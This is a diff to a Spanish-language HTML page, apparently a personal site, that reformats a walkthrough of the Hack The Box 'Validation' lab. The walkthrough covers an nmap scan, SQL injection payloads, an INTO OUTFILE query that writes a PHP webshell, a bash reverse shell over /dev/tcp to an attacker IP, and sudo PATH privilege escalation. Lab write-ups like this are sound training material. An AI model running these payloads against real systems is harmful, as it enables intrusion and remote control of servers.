@@ -42,60 +42,61 @@
           <a href="#pasos" class="btn">Ver Guía</a>
           <a href="https://youtu.be/78i-qbhEUVU" target="_blank" class="btn btn-outline">Ver Video</a>
         </div>
-        <section class="section" id="pasos">
-            <h2>Paso a Paso - Validación (HTB)</h2>
-            <h3>1. Escaneo de Puertos (Nmap)</h3>
-            <pre><code>nmap -sC -sV -oN nmap/initial 10.10.11.116</code></pre>
-                <ul>
-                    <li>22/tcp - SSH</li>
-                    <li>80/tcp - HTTP</li>
-                    <li>3306/tcp - MySQL</li>
-                </ul>
+      </section>
     
-            <h3>2. Enumeración Web</h3>
-            <p>Se detecta un formulario que acepta códigos de validación. Se sospecha de SQL Injection.</p>
+      <section class="section" id="pasos">
+        <h2>Paso a Paso - Validación (HTB)</h2>
     
-            <h3>3. SQL Injection (Union/Error-Based)</h3>
-            <pre><code>' or 1=1 --
-            ' UNION SELECT null, @@version, null --
-            ' UNION SELECT null, schema_name, null FROM information_schema.schemata --</code></pre>
+        <h3>1. Escaneo de Puertos (Nmap)</h3>
+        <pre><code>nmap -sC -sV -oN nmap/initial 10.10.11.116</code></pre>
+        <ul>
+          <li>22/tcp - SSH</li>
+          <li>80/tcp - HTTP</li>
+          <li>3306/tcp - MySQL</li>
+        </ul>
     
-            <h3>4. Escribir Webshell con INTO OUTFILE</h3>
-            <pre><code>' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --</code></pre>
+        <h3>2. Enumeración Web</h3>
+        <p>Se detecta un formulario que acepta códigos de validación. Se sospecha de SQL Injection.</p>
     
-            <h3>5. Shell Inversa con Netcat</h3>
-            <pre>
-                <code>// Escucha en tu máquina:
-                        nc -lvnp 4444
-                        // Desde la webshell:
-                     http://10.10.11.116/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1'
-                </code>
-            </pre>
+        <h3>3. SQL Injection (Union/Error-Based)</h3>
+        <pre><code>' or 1=1 --
+    ' UNION SELECT null, @@version, null --
+    ' UNION SELECT null, schema_name, null FROM information_schema.schemata --</code></pre>
     
-            <h3>6. Escalada a Usuario</h3>
-            <p>Busca credenciales en archivos web. Usa <code>su</code> para cambiar de usuario con esas claves.</p>
+        <h3>4. Escribir Webshell con INTO OUTFILE</h3>
+        <pre><code>' UNION SELECT "&lt;?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --</code></pre>
     
-            <h3>7. Escalada a Root</h3>
-            <pre><code>sudo -l</code></pre>
-            <p>Detecta script ejecutable sin contraseña. Explota la mala configuración (por ejemplo, usando PATH).</p>
+        <h3>5. Shell Inversa con Netcat</h3>
+        <pre><code>// Escucha en tu máquina:
+    nc -lvnp 4444
     
-            <h3>Notas:</h3>
-            <ul>
-            <li>Webshell ubicada en <code>/var/www/html/shell.php</code></li>
-            <li>Se accede al sistema como usuario web y luego se eleva a root</li>
-            <li>Buena práctica: revisar <code>.bash_history</code> y archivos .conf</li>
-            </ul>
+    // Desde la webshell:
+    http://10.10.11.116/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1'</code></pre>
     
-            <figure>
-            <img src="imagenes/validation.png" alt="HTB Validation Resultado" />
-            <figcaption>Figura: Shell obtenida y escalamiento a root en HTB Validation</figcaption>
-            </figure>
-        </section>
-    </section>
+        <h3>6. Escalada a Usuario</h3>
+        <p>Busca credenciales en archivos web. Usa <code>su</code> para cambiar de usuario con esas claves.</p>
+    
+        <h3>7. Escalada a Root</h3>
+        <pre><code>sudo -l</code></pre>
+        <p>Detecta script ejecutable sin contraseña. Explota la mala configuración (por ejemplo, usando PATH).</p>
+    
+        <h3>Notas:</h3>
+        <ul>
+          <li>Webshell ubicada en <code>/var/www/html/shell.php</code></li>
+          <li>Se accede al sistema como usuario web y luego se eleva a root</li>
+          <li>Buena práctica: revisar <code>.bash_history</code> y archivos .conf</li>
+        </ul>
+    
+        <figure>
+          <img src="imagenes/validation.png" alt="HTB Validation Resultado" />
+          <figcaption>Figura: Shell obtenida y escalamiento a root en HTB Validation</figcaption>
+        </figure>
+      </section>
+    
       <footer>
         <p>&copy; 2025 Mabel Julieth Trujillo. Todos los derechos reservados.</p>
       </footer>
+    
       <script src="js/main.js"></script>
 </body>
 </html>
-    
